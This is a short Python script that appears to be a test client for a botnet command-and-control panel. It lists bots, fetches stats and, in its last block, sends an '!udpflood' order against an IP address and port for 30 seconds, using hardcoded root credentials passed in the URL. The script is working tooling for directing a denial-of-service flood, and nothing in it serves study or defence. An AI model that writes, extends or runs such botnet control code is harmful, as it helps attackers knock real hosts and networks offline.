import requests
import json

BASE_URL = "http://192.168.0.216:8080"
USERNAME = "root"
PASSWORD = "root"  # Replace with actual password
TOKEN = f"{USERNAME}-{PASSWORD}-token"

# Test health endpoint
response = requests.get(f"{BASE_URL}/api/health")
print("Health:", response.json())

# Test stats endpoint
response = requests.get(f"{BASE_URL}/api/stats?username={USERNAME}&token={TOKEN}")
print("Stats:", response.json())

# Test bots endpoint
response = requests.get(f"{BASE_URL}/api/bots?username={USERNAME}&token={TOKEN}")
print("Bots:", response.json())

# Test attack endpoint
attack_data = {
    "method": "!udpflood",
    "target_ip": "192.168.1.100",
    "port": 80,
    "duration": 30,
    "username": USERNAME,
    "token": TOKEN
}

response = requests.post(
    f"{BASE_URL}/api/attack",
    headers={"Content-Type": "application/json"},
    data=json.dumps(attack_data)
)
print("Attack:", response.json())